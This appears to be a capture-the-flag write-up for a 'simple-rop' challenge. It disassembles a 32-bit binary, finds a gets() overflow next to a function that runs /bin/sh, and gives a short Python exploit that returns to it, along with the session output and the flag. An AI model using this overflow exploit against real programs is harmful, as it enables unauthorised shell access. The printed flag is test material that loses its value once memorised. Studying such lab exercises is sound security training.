### Solved by superkojiman

The target is a 32-bit ELF binary. We're given a shell on a target with ASLR disabled:

```
superkojiman@ubuntu-512mb-nyc3-01:/problems/simple-rop_0$ ls -l
total 12
-r--r----- 1 hacksports simple-rop_0   21 Mar 19 18:28 flag.txt
-rwxr-sr-x 1 hacksports simple-rop_0 7508 Mar 19 18:28 rop1
```

I found two interesting functions, `get_input()` and `get_flag()`:

```
[0x080483e0]> pdf@sym.get_input
/ (fcn) sym.get_input 53
|           ; var int local_88h    @ ebp-0x88
|           ; CALL XREF from 0x08048556 (sym.get_input)
|           0x080484f4      55             push ebp
|           0x080484f5      89e5           mov ebp, esp
|           0x080484f7      81ec88000000   sub esp, 0x88
|           0x080484fd      83ec0c         sub esp, 0xc
|           0x08048500      8d8578ffffff   lea eax, [ebp - local_88h]
|           0x08048506      50             push eax
|           0x08048507      e874feffff     call sym.imp.gets
|           0x0804850c      83c410         add esp, 0x10
|           0x0804850f      83ec08         sub esp, 8
|           0x08048512      8d8578ffffff   lea eax, [ebp - local_88h]
|           0x08048518      50             push eax
|           0x08048519      68f8850408     push str.You_said:__s_n     ; "You said: %s." @ 0x80485f8
|           0x0804851e      e84dfeffff     call sym.imp.printf
|           0x08048523      83c410         add esp, 0x10
|           0x08048526      90             nop
|           0x08048527      c9             leave
\           0x08048528      c3             ret
[0x080483e0]>
```

`get_input()` uses `gets()`, which does no bounds checking. EIP is overwritten when 140 bytes are read in. `get_flag()` basically gives us a shell:

```
[0x080483e0]> pdf@sym.get_flag
/ (fcn) sym.get_flag 25
|           0x080484db      55             push ebp
|           0x080484dc      89e5           mov ebp, esp
|           0x080484de      83ec08         sub esp, 8
|           0x080484e1      83ec0c         sub esp, 0xc
|           0x080484e4      68f0850408     push str._bin_sh            ; "/bin/sh" @ 0x80485f0
|           0x080484e9      e8b2feffff     call sym.imp.system
|           0x080484ee      83c410         add esp, 0x10
|           0x080484f1      90             nop
|           0x080484f2      c9             leave
\           0x080484f3      c3             ret
```

So all I had to do was return to 0x080484db, and I'd get a shell. Simple ROP requires a simple exploit:

```
#!/usr/bin/env python
from struct import *
buf  = "A"*140
buf += pack("<I", 0x080484db)       # ret to get_flag()
print buf
```

Here we go:

```
superkojiman@ubuntu-512mb-nyc3-01:/problems/simple-rop_0$ (~/sploit.py; cat) | ./rop1
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÛ„
id
uid=1260(superkojiman) gid=1281(simple-rop_0) groups=1281(simple-rop_0),1001(competitors),1261(superkojiman)
cat flag.txt
lasactf{ret_1s_c0ol}
```

Flag is `lasactf{ret_1s_c0ol}`
